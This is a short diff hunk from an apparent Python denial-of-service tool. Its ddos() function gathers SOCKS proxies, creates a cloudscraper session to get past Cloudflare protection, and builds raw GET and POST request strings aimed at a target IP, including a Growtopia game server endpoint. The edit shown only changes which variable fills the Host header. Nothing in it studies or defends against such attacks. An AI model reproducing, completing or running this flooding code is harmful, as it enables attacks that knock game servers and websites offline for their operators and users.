@@ -2451,7 +2451,7 @@ def Headers(method):
 def ddos():
     socksCrawler()
     scraper = cloudscraper.create_scraper()
-    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(ip).netloc + "\r\n"
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_again = "POST http://" + ip + "/growtopia/server_data.php"
